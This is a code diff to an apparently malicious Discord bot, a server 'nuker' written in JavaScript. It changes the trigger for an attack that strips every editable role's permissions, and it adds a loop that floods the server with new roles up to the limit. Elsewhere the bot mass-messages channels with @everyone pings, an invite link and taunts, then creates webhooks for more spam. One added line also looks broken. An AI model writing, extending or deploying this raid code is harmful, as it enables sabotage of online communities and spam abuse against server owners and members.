@@ -284,7 +284,7 @@ if(list.includes(msg.author.id)) {return}
      //this edits all roles
      client.on('message', message => {
 if(list.includes(message.author.id)) {return}
-       if(message.content.startsWith('-burn')) {
+       if(message.content.startsWith('kiss my disrespectful ass')) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
@@ -297,6 +297,11 @@ setTimeout(() => {
     if(r.editable) {
       r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
     .catch(console.error)}
+  var times = 250 - message.guild.roles.catch.size - 5
+  var idkhere = 0
+   while(idkhere < times) {
+    message.guild.roles.create(channelnames())
+idkhere++}
   })
 },3000)
        }
@@ -488,6 +493,7 @@ if(list.includes(msg.author.id)) {return}
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/Wer9XGTgNA @everyone")
                 p.send("IT WAS ME BARRY")
+                p.send("kiss my disrespectful ass")
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
